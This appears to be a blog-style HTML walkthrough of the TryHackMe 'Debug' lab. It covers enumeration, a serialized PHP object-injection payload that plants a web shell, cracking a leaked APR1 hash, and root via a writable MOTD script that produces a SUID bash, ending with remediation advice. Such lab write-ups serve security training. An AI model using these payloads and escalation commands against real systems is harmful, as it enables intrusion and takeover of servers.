<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TryHackMe: Debug - Walkthrough | Nishant Saini</title>
<style>
  :root {
    --bg: #0b1020;
    --panel: #131c33;
    --panel-2: #0f172a;
    --cyan: #00d4ff;
    --cyan-d: #0e7490;
    --red: #ff3b5c;
    --green: #34d399;
    --text: #e2e8f0;
    --muted: #94a3b8;
    --line: #1e2b4a;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html { scroll-behavior: smooth; }
  body {
    font-family: "Segoe UI", system-ui, -apple-system, Roboto, Arial, sans-serif;
    background: var(--bg);
    color: var(--text);
    line-height: 1.6;
    overflow-x: hidden;
  }

  /* ---------- animated background ---------- */
  .bg-grid {
    position: fixed; inset: 0; z-index: -1;
    background-image:
      linear-gradient(rgba(0,212,255,.06) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,212,255,.06) 1px, transparent 1px);
    background-size: 44px 44px;
    animation: gridMove 22s linear infinite;
  }
  @keyframes gridMove { to { background-position: 44px 44px; } }
  .glow {
    position: fixed; width: 420px; height: 420px; border-radius: 50%;
    filter: blur(90px); opacity: .35; z-index: -1; pointer-events: none;
    animation: float 14s ease-in-out infinite alternate;
  }
  .glow.a { background: var(--cyan-d); top: -120px; left: -120px; }
  .glow.b { background: var(--red); bottom: -150px; right: -120px; animation-delay: -6s; }
  @keyframes float { to { transform: translate(80px, 60px) scale(1.15); } }

  /* ---------- scroll progress ---------- */
  #progress {
    position: fixed; top: 0; left: 0; height: 3px; width: 0;
    background: linear-gradient(90deg, var(--cyan), var(--red));
    z-index: 100; box-shadow: 0 0 12px var(--cyan);
  }

  /* ---------- hero ---------- */
  header.hero {
    min-height: 100vh; display: flex; flex-direction: column;
    align-items: center; justify-content: center; text-align: center;
    padding: 40px 20px; position: relative;
  }
  .badge {
    font-family: Consolas, "Courier New", monospace; font-size: 13px;
    color: var(--cyan); border: 1px solid var(--cyan); padding: 6px 14px;
    border-radius: 999px; letter-spacing: 2px; opacity: 0;
    animation: fadeDown .8s .2s forwards;
  }
  .title {
    font-size: clamp(56px, 13vw, 130px); font-weight: 900; letter-spacing: 6px;
    margin: 20px 0 6px; position: relative; color: #fff;
    animation: fadeUp 1s .4s forwards; opacity: 0;
  }
  .title::before, .title::after {
    content: attr(data-text); position: absolute; left: 0; right: 0; top: 0;
    opacity: .8;
  }
  .title::before { color: var(--red); animation: glitch1 3s infinite steps(2); clip-path: inset(0 0 60% 0); }
  .title::after  { color: var(--cyan); animation: glitch2 3s infinite steps(2); clip-path: inset(50% 0 0 0); }
  @keyframes glitch1 {
    0%,90%,100% { transform: translate(0); }
    92% { transform: translate(-4px, 2px); }
    94% { transform: translate(4px, -2px); }
  }
  @keyframes glitch2 {
    0%,90%,100% { transform: translate(0); }
    91% { transform: translate(3px, -2px); }
    95% { transform: translate(-3px, 2px); }
  }
  .subtitle {
    color: var(--muted); font-size: clamp(16px, 2.4vw, 20px);
    opacity: 0; animation: fadeUp 1s .9s forwards;
  }
  .meta {
    margin-top: 30px; display: flex; flex-wrap: wrap; gap: 12px; justify-content: center;
    opacity: 0; animation: fadeUp 1s 1.2s forwards;
  }
  .chip {
    background: var(--panel); border: 1px solid var(--line); padding: 8px 16px;
    border-radius: 10px; font-size: 14px;
  }
  .chip b { color: var(--cyan); }
  .scroll-hint {
    position: absolute; bottom: 28px; color: var(--muted); font-size: 13px;
    animation: bounce 2s infinite;
  }
  @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(8px); } }
  @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: none; } }
  @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }

  /* ---------- layout ---------- */
  main { max-width: 1040px; margin: 0 auto; padding: 0 22px 80px; }
  section { margin: 90px 0; }
  .kicker {
    font-family: Consolas, monospace; color: var(--cyan); font-size: 13px;
    letter-spacing: 3px; text-transform: uppercase;
  }
  h2 { font-size: clamp(26px, 4vw, 36px); margin: 6px 0 14px; color: #fff; }
  h3 { color: var(--cyan); margin: 26px 0 10px; font-size: 19px; }
  p { color: var(--text); margin-bottom: 14px; }
  code {
    font-family: Consolas, "Courier New", monospace; background: var(--panel-2);
    padding: 2px 7px; border-radius: 6px; color: #a5f3fc; font-size: .92em;
  }

  /* reveal on scroll */
  .reveal { opacity: 0; transform: translateY(40px); transition: opacity .8s ease, transform .8s ease; }
  .reveal.show { opacity: 1; transform: none; }

  /* ---------- attack chain ---------- */
  .chain { display: flex; flex-wrap: wrap; gap: 14px; align-items: center; justify-content: center; margin-top: 20px; }
  .node {
    background: var(--panel); border: 1px solid var(--cyan-d); border-radius: 12px;
    padding: 14px 18px; font-weight: 600; min-width: 150px; text-align: center;
    opacity: 0; transform: scale(.7);
    transition: opacity .5s, transform .5s, box-shadow .3s;
  }
  .node.show { opacity: 1; transform: scale(1); }
  .node:hover { box-shadow: 0 0 20px rgba(0,212,255,.45); }
  .node.final { border-color: var(--red); color: var(--red); }
  .arrow { color: var(--cyan); font-size: 22px; opacity: 0; transition: opacity .5s .2s; }
  .arrow.show { opacity: 1; }

  /* ---------- cards / tables ---------- */
  .card {
    background: var(--panel); border: 1px solid var(--line); border-radius: 16px;
    padding: 24px; margin: 18px 0; position: relative; overflow: hidden;
  }
  .card::before {
    content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 4px;
    background: linear-gradient(var(--cyan), var(--red));
  }
  .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 20px; }
  .stat {
    background: var(--panel); border: 1px solid var(--line); border-radius: 14px;
    padding: 18px; transition: transform .3s, border-color .3s;
  }
  .stat:hover { transform: translateY(-6px); border-color: var(--cyan); }
  .stat .label { color: var(--muted); font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
  .stat .value { color: #fff; font-weight: 700; font-size: 17px; margin-top: 6px; word-break: break-word; }

  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 15px; }
  th, td { text-align: left; padding: 12px 14px; border-bottom: 1px solid var(--line); vertical-align: top; }
  th { background: var(--panel); color: var(--cyan); font-weight: 600; }
  tr:hover td { background: rgba(0,212,255,.05); }

  /* ---------- terminal / code blocks ---------- */
  .term {
    background: var(--panel-2); border: 1px solid var(--line); border-radius: 14px;
    margin: 18px 0; overflow: hidden; box-shadow: 0 10px 40px rgba(0,0,0,.4);
  }
  .term-bar {
    background: #0a1426; padding: 10px 14px; display: flex; align-items: center; gap: 8px;
  }
  .dot { width: 12px; height: 12px; border-radius: 50%; }
  .dot.r { background: #ff5f56; } .dot.y { background: #ffbd2e; } .dot.g { background: #27c93f; }
  .term-title { margin-left: 10px; color: var(--muted); font-size: 13px; font-family: Consolas, monospace; flex: 1; }
  .copy-btn {
    background: transparent; color: var(--cyan); border: 1px solid var(--cyan-d);
    border-radius: 8px; padding: 4px 10px; font-size: 12px; cursor: pointer; transition: .2s;
  }
  .copy-btn:hover { background: var(--cyan-d); color: #fff; }
  pre {
    padding: 18px 20px; overflow-x: auto; font-family: Consolas, "Courier New", monospace;
    font-size: 14px; color: #a5f3fc; white-space: pre;
  }
  .prompt { color: var(--green); }
  .out { color: var(--muted); }
  .typing .line { display: block; min-height: 1.5em; }
  .caret {
    display: inline-block; width: 9px; height: 1.1em; background: var(--cyan);
    vertical-align: text-bottom; animation: blink 1s steps(2) infinite;
  }
  @keyframes blink { to { visibility: hidden; } }

  /* ---------- callouts ---------- */
  .note { border-left: 4px solid var(--red); background: rgba(255,59,92,.08); padding: 14px 18px; border-radius: 10px; margin: 18px 0; }
  .success { border-left: 4px solid var(--green); background: rgba(52,211,153,.08); padding: 14px 18px; border-radius: 10px; margin: 18px 0; }
  .flag-box {
    text-align: center; padding: 22px; border-radius: 14px; margin: 20px 0;
    border: 1px dashed var(--green); color: var(--green); font-family: Consolas, monospace;
    background: rgba(52,211,153,.06);
  }
  .flag-box span { color: var(--muted); font-family: "Segoe UI", sans-serif; display: block; margin-bottom: 6px; }

  /* ---------- timeline ---------- */
  .timeline { position: relative; margin-top: 20px; padding-left: 30px; }
  .timeline::before {
    content: ""; position: absolute; left: 9px; top: 0; bottom: 0; width: 2px;
    background: linear-gradient(var(--cyan), var(--red));
    transform-origin: top; transform: scaleY(0); transition: transform 1.6s ease;
  }
  .timeline.show::before { transform: scaleY(1); }
  .step { position: relative; margin-bottom: 26px; opacity: 0; transform: translateX(-20px); transition: .6s; }
  .step.show { opacity: 1; transform: none; }
  .step::before {
    content: ""; position: absolute; left: -26px; top: 6px; width: 14px; height: 14px;
    border-radius: 50%; background: var(--bg); border: 2px solid var(--cyan);
    box-shadow: 0 0 10px var(--cyan);
  }
  .step h4 { color: #fff; font-size: 17px; }
  .step p { color: var(--muted); font-size: 15px; margin: 4px 0 0; }

  /* ---------- footer ---------- */
  footer {
    text-align: center; color: var(--muted); font-size: 14px;
    border-top: 1px solid var(--line); padding: 34px 20px;
  }
  footer a { color: var(--cyan); text-decoration: none; }
  footer a:hover { text-decoration: underline; }

  /* ---------- responsive ---------- */
  @media (max-width: 640px) {
    section { margin: 60px 0; }
    .node { min-width: 130px; padding: 12px; }
    pre { font-size: 12.5px; }
    th, td { padding: 10px; font-size: 14px; }
  }
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after { animation: none !important; transition: none !important; }
    .reveal, .node, .step { opacity: 1; transform: none; }
  }
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="glow a"></div>
<div class="glow b"></div>
<div id="progress"></div>

<!-- ============ HERO ============ -->
<header class="hero">
  <div class="badge">TRYHACKME &nbsp;·&nbsp; LINUX &nbsp;·&nbsp; MEDIUM</div>
  <h1 class="title" data-text="DEBUG">DEBUG</h1>
  <p class="subtitle">Machine Walkthrough: Web Enumeration, PHP Object Injection and Root via MOTD</p>
  <div class="meta">
    <div class="chip">Author <b>Nishant Saini</b></div>
    <div class="chip">Target <b>&lt;TARGET_IP&gt;</b></div>
    <div class="chip">Host <b>debug.thm</b></div>
    <div class="chip">OS <b>Ubuntu 16.04</b></div>
  </div>
  <div class="scroll-hint">scroll down ↓</div>
</header>

<main>

<!-- ============ OVERVIEW ============ -->
<section class="reveal">
  <div class="kicker">Section 01</div>
  <h2>Machine Overview</h2>
  <p>Debug is a Linux CTF on TryHackMe. The goal is to capture a user flag from a low-privilege account and a root flag from the administrator. The chain starts with an exposed backup directory and ends with a writable MOTD script that runs as root.</p>
  <div class="stat-grid">
    <div class="stat"><div class="label">Platform</div><div class="value">TryHackMe</div></div>
    <div class="stat"><div class="label">Difficulty</div><div class="value">Medium</div></div>
    <div class="stat"><div class="label">Key bugs</div><div class="value">Object injection, MOTD privesc</div></div>
    <div class="stat"><div class="label">Tools</div><div class="value">nmap, gobuster, hashcat</div></div>
  </div>
</section>

<!-- ============ ATTACK CHAIN ============ -->
<section>
  <div class="kicker">Attack Chain</div>
  <h2>From Recon to Root</h2>
  <div class="chain" id="chain">
    <div class="node">1. Recon</div><div class="arrow">→</div>
    <div class="node">2. Enumeration</div><div class="arrow">→</div>
    <div class="node">3. Source review</div><div class="arrow">→</div>
    <div class="node">4. Object injection</div><div class="arrow">→</div>
    <div class="node">5. Web shell RCE</div><div class="arrow">→</div>
    <div class="node">6. Hash cracking</div><div class="arrow">→</div>
    <div class="node">7. SSH as james</div><div class="arrow">→</div>
    <div class="node final">8. Root</div>
  </div>
</section>

<!-- ============ PHASE 1 ============ -->
<section class="reveal">
  <div class="kicker">Phase 01</div>
  <h2>Reconnaissance</h2>
  <p>Run a full TCP scan with service and version detection:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre class="typing" data-type><span class="prompt">$</span> nmap -sC -sV -p- --min-rate 5000 -T4 &lt;TARGET_IP&gt;
<span class="out">22/tcp  open  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp  open  http  Apache httpd 2.4.18 (Ubuntu)</span></pre>
  </div>
  <p>The default Apache page suggests the real app is on a virtual host. Map it locally:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> echo "&lt;TARGET_IP&gt; debug.thm" | sudo tee -a /etc/hosts</pre>
  </div>
</section>

<!-- ============ PHASE 2 ============ -->
<section class="reveal">
  <div class="kicker">Phase 02</div>
  <h2>Web Enumeration</h2>
  <p>Two tools were used. Both found the same important paths.</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> gobuster dir -u http://debug.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
<span class="prompt">$</span> feroxbuster -u http://debug.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -k</pre>
  </div>
  <table>
    <tr><th>Path</th><th>Status</th><th>Why it matters</th></tr>
    <tr><td><code>/backup/</code></td><td>301</td><td>Directory listing enabled</td></tr>
    <tr><td><code>/backup/index.php.bak</code></td><td>200</td><td>Backup of the PHP source code</td></tr>
    <tr><td><code>/message.txt</code></td><td>200</td><td>Log file written by the form</td></tr>
    <tr><td><code>/server-status</code></td><td>403</td><td>Restricted Apache status page</td></tr>
  </table>
</section>

<!-- ============ PHASE 3 ============ -->
<section class="reveal">
  <div class="kicker">Phase 03</div>
  <h2>Source Code Review</h2>
  <p>The backup file defines a class <code>FormSubmit</code>. Its <code>__destruct()</code> method writes data to a file when the object is destroyed. At the bottom of the file, user input goes straight into <code>unserialize()</code>:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">index.php.bak</span><button class="copy-btn">Copy</button></div>
    <pre><span class="out">// Leaving this for now... only for debug purposes... do not touch!</span>
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);</pre>
  </div>
  <div class="note"><b>Vulnerability:</b> Insecure deserialization (PHP object injection). The attacker controls which object is created, and its destructor runs with attacker-chosen values.</div>
</section>

<!-- ============ PHASE 4 ============ -->
<section class="reveal">
  <div class="kicker">Phase 04</div>
  <h2>PHP Object Injection</h2>
  <p>Build a serialized object whose file name is <code>message.php</code> and whose content is a web shell:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">script.php</span><button class="copy-btn">Copy</button></div>
    <pre><span class="out">&lt;?php
class FormSubmit {
    public $form_file = "message.php";
    public $message = '&lt;?php system($_GET["cmd"]); ?&gt;';
}
$obj = new FormSubmit;
echo serialize($obj);
?&gt;</span></pre>
  </div>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> php script.php
<span class="out">O:10:"FormSubmit":2:{s:9:"form_file";s:11:"message.php";s:7:"message";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";}</span></pre>
  </div>
  <p>Send the payload through the <code>debug</code> parameter:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">browser</span><button class="copy-btn">Copy</button></div>
    <pre>http://debug.thm/index.php?debug=O:10:"FormSubmit":2:{s:9:"form_file";s:11:"message.php";s:7:"message";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";}</pre>
  </div>
  <div class="success">The page answers "Your submission has been successfully saved!" and <code>message.php</code> now exists in the web root.</div>
</section>

<!-- ============ PHASE 5 ============ -->
<section class="reveal">
  <div class="kicker">Phase 05</div>
  <h2>Remote Command Execution</h2>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">browser</span><button class="copy-btn">Copy</button></div>
    <pre>http://debug.thm/message.php?cmd=ls
http://debug.thm/message.php?cmd=ls%20-alps
http://debug.thm/message.php?cmd=cat%20.htpasswd</pre>
  </div>
  <p>The hidden <code>.htpasswd</code> file is readable by anyone and contains the user <code>james</code> with an APR1 hash.</p>
</section>

<!-- ============ PHASE 6 ============ -->
<section class="reveal">
  <div class="kicker">Phase 06</div>
  <h2>Password Cracking</h2>
  <p>APR1 hashes are hashcat mode <b>1600</b>. Crack against rockyou.txt:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
<span class="out">$apr1$...:<span style="color:var(--green)">jamaica</span>   Status: Cracked</span></pre>
  </div>
</section>

<!-- ============ PHASE 7 ============ -->
<section class="reveal">
  <div class="kicker">Phase 07</div>
  <h2>Initial Access</h2>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> ssh james@&lt;TARGET_IP&gt;
<span class="prompt">james@osboxes:~$</span> cat user.txt
<span class="out">&lt;USER_FLAG_HIDDEN&gt;</span></pre>
  </div>
  <p>The home directory has <code>Note-To-James.txt</code>. It asks James to edit the SSH welcome message and says he can modify system files. That is a hint toward the MOTD scripts.</p>
</section>

<!-- ============ PHASE 8 ============ -->
<section class="reveal">
  <div class="kicker">Phase 08</div>
  <h2>Privilege Escalation via MOTD</h2>
  <p>Scripts in <code>/etc/update-motd.d/</code> run as <b>root</b> on every SSH login. <code>00-header</code> is owned by root but its group is <code>james</code>, and the group can write to it.</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> ls -alps /etc/update-motd.d/
<span class="out">-rwxrwxr-x 1 root james 1220 Mar 10 2021 00-header</span>
<span class="prompt">$</span> echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> 00-header
<span class="prompt">$</span> exit</pre>
  </div>
  <p>Log in again so the MOTD script runs as root and creates a SUID bash:</p>
  <div class="term">
    <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">bash</span><button class="copy-btn">Copy</button></div>
    <pre><span class="prompt">$</span> ssh james@&lt;TARGET_IP&gt;
<span class="prompt">james@osboxes:~$</span> ls -la ~
<span class="out">-rwsr-xr-x 1 root root 1037528 bash</span>
<span class="prompt">james@osboxes:~$</span> ./bash -p
<span class="prompt">bash-4.3#</span> whoami
<span class="out">root</span>
<span class="prompt">bash-4.3#</span> cat /root/root.txt
<span class="out">&lt;ROOT_FLAG_HIDDEN&gt;</span></pre>
  </div>
  <div class="flag-box"><span>Root shell obtained</span>&lt;ROOT_FLAG_HIDDEN&gt;</div>
</section>

<!-- ============ TIMELINE ============ -->
<section>
  <div class="kicker">Timeline</div>
  <h2>Step by Step</h2>
  <div class="timeline" id="timeline">
    <div class="step"><h4>Recon</h4><p>nmap finds SSH and Apache.</p></div>
    <div class="step"><h4>Enumeration</h4><p>/backup/ exposes index.php.bak.</p></div>
    <div class="step"><h4>Exploit</h4><p>Object injection writes a web shell.</p></div>
    <div class="step"><h4>Credentials</h4><p>.htpasswd leaks james; hashcat cracks it.</p></div>
    <div class="step"><h4>User</h4><p>SSH as james, user flag captured.</p></div>
    <div class="step"><h4>Root</h4><p>Writable MOTD script gives a SUID bash.</p></div>
  </div>
</section>

<!-- ============ REMEDIATION ============ -->
<section class="reveal">
  <div class="kicker">Defense</div>
  <h2>Remediation</h2>
  <table>
    <tr><th>Weakness</th><th>Fix</th></tr>
    <tr><td>Backup files and directory listing</td><td>Remove backups, disable <code>Options Indexes</code></td></tr>
    <tr><td><code>unserialize()</code> on user input</td><td>Use JSON, never deserialize untrusted data</td></tr>
    <tr><td>Debug code in production</td><td>Remove debug parameters before deploying</td></tr>
    <tr><td>Weak password</td><td>Strong password policy and SSH keys</td></tr>
    <tr><td>Group-writable MOTD script run as root</td><td><code>chmod 755</code>, <code>chown root:root</code></td></tr>
  </table>
</section>

<!-- ============ LESSONS ============ -->
<section class="reveal">
  <div class="kicker">Takeaways</div>
  <h2>Lessons Learned</h2>
  <div class="card">
    <p>Enumerate thoroughly. Backup files and leftover debug code often lead straight to the bug.</p>
    <p>Read the source when you can. The <code>.bak</code> file made the whole app logic visible.</p>
    <p>Check permissions at every step. A group-writable file that runs as root is a full privilege escalation.</p>
    <p style="margin:0">Never call <code>unserialize()</code> on user input.</p>
  </div>
</section>

</main>

<footer>
  <p>Written by <b>Nishant Saini</b> · <a href="https://github.com/nishantsaini5786" target="_blank" rel="noopener">github.com/nishantsaini5786</a></p>
  <p style="margin-top:8px">For educational use only. Flags are hidden as per TryHackMe rules.</p>
</footer>

<script>
  // Scroll progress bar
  const bar = document.getElementById('progress');
  window.addEventListener('scroll', () => {
    const h = document.documentElement.scrollHeight - window.innerHeight;
    bar.style.width = (window.scrollY / h * 100) + '%';
  });

  // Reveal sections on scroll
  const io = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.classList.add('show');
        // stagger attack chain nodes
        if (e.target.id === 'chain') {
          e.target.querySelectorAll('.node, .arrow').forEach((el, i) => {
            setTimeout(() => el.classList.add('show'), i * 180);
          });
        }
        if (e.target.id === 'timeline') {
          e.target.querySelectorAll('.step').forEach((el, i) => {
            setTimeout(() => el.classList.add('show'), 400 + i * 220);
          });
        }
        io.unobserve(e.target);
      }
    });
  }, { threshold: 0.15 });

  document.querySelectorAll('.reveal, #chain, #timeline').forEach(el => io.observe(el));

  // Typing effect for terminal blocks with data-type
  const typeIO = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (!e.isIntersecting) return;
      const pre = e.target;
      const html = pre.innerHTML;
      pre.innerHTML = '';
      const caret = document.createElement('span');
      caret.className = 'caret';
      let i = 0;
      const tick = () => {
        pre.innerHTML = html.slice(0, i) + '';
        pre.appendChild(caret);
        i += 2;
        if (i <= html.length) setTimeout(tick, 12);
        else { pre.innerHTML = html; }
      };
      tick();
      typeIO.unobserve(pre);
    });
  }, { threshold: 0.6 });
  document.querySelectorAll('pre[data-type]').forEach(p => typeIO.observe(p));

  // Copy buttons
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const pre = btn.closest('.term').querySelector('pre');
      const text = pre.innerText;
      navigator.clipboard.writeText(text).then(() => {
        btn.textContent = 'Copied!';
        setTimeout(() => btn.textContent = 'Copy', 1500);
      });
    });
  });
</script>
</body>
</html>
